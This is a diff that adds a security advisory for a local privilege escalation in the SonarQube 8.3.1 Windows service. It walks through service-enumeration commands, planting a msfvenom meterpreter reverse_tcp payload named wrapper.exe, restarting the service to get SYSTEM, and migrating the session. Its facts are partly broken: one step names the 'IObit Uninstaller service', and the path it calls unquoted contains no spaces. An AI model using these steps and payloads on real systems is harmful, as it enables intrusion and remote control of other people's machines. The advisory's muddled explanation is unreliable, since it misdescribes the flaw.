@@ -1,0 +1,65 @@
+# Title: Sonar Qube 8.3.1 - 'SonarQube Service' Unquoted Service Path
+# Author: Velayutham Selvaraj
+# Date: 2020-06-03
+# Vendor Homepage: https://www.sonarqube.org
+# Software Link: https://www.sonarqube.org/downloads/
+# Version : 8.3.1
+# Tested on: Windows 10 64bit(EN)
+
+About Unquoted Service Path :
+==============================
+
+When a service is created whose executable path contains spaces and isn't
+enclosed within quotes,
+leads to a vulnerability known as Unquoted Service Path which allows a user
+to gain SYSTEM privileges.
+(only if the vulnerable service is running with SYSTEM privilege level
+which most of the time it is).
+
+Steps to recreate :
+=============================
+
+1.  Open CMD and Check for USP vulnerability by typing [ wmic service get
+name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v
+"c:\windows\\" | findstr /i /v """ ]
+2.  The Vulnerable Service would Show up.
+3.  Check the Service Permissions by typing [ sc qc SonarQube]
+4.  The command would return..
+
+C:\Users\HP-840-G2-ELITEBOOK>sc qc SonarQube
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SonarQube
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   :
+C:\Users\HP-840-G2-ELITEBOOK\Downloads\sonarqube-8.3.1.34397\sonarqube-8.3.1.34397\bin\windows-x86-64\wrapper.exe
+-s
+C:\Users\HP-840-G2-ELITEBOOK\Downloads\sonarqube-8.3.1.34397\sonarqube-8.3.1.34397\conf\wrapper.conf
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : SonarQube
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+5.  This concludes that the service is running as SYSTEM. "Highest
+privilege in a machine"
+6.  Now create a Payload with msfvenom or other tools and name it to
+wrapper.exe
+7.  Make sure you have write Permissions to where you downloaded. i kept it
+in downloads folders but confirmed it in program files as well.
+8.  Provided that you have right permissions, Drop the wrapper.exe
+executable you created into the
+"C:\Users\HP-840-G2-ELITEBOOK\Downloads\sonarqube-8.3.1.34397\sonarqube-8.3.1.34397\bin\windows-x86-64\"
+Directory.
+9.  Now restart the IObit Uninstaller service by giving coommand [ sc stop
+SonarQube] followed by [ sc start SonarQube]
+10. If your payload is created with msfvenom, quickly migrate to a
+different process. [Any process since you have the SYSTEM Privilege].
+
+During my testing :
+
+Payload : msfvenom -p windows/meterpreter/reverse_tcp -f exe -o wrapper.exe
+Migrate : meterpreter> run post/windows/manage/migrate [To migrate into a
+different Process ]
